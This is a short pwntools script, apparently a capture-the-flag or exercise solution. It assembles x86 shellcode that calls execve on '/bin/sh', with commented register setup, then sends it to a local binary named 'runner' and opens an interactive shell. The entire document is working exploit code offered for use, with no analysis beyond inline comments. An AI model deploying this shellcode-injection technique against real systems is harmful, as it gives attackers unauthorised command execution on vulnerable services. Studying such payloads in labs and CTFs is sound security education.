from pwn import *

shellcode = asm('''

## Going to use execve
#### eax = 0xb
#### ebx = path (char*)
#### ecx = args (char**)
#### edx = env  (char**)

xor edx, edx ### edx = 0 (NULL)
xor ecx, ecx ### ecx = 0 (NULL)

/*
    // Push /bin///sh onto the stack
    push 0x68        ## h[NUL][NUL][NUL] (Same as push 0x00000068)
    push 0x732f2f2f  ## ///s 
    push 0x6e69622f  ## /bin
*/

push 0x0068732f  ## /sh[NUL]
push 0x6e69622f  ## /bin

mov ebx, esp ## ebx = esp #### 1000 IQ move.

mov eax, 0xb ## eax = 0xb
int 0x80  /* Trigger syscall */
''')

p = process("./runner")
p.send(shellcode)
p.interactive()
